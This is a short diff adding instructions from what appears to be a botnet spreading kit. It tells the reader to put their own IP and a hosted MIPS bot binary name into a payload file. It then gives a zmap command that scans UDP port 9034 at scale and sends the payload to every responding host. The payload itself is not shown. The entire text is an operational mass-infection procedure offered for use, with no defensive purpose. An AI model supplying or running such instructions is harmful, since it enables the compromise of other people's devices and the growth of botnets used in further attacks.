@@ -1,0 +1,7 @@
+Open Payload and change IPHERE to your ip
+CHANGE MPSLHERE to your mpsl bin
+for example: xd.mpsl (has to be the mpsl name in your /var/www/html/)
+after you have done that
+
+Paste This Into Your server.
+zmap -p9034 -Mudp -wrt.zone --probe-args=file:payload -T5
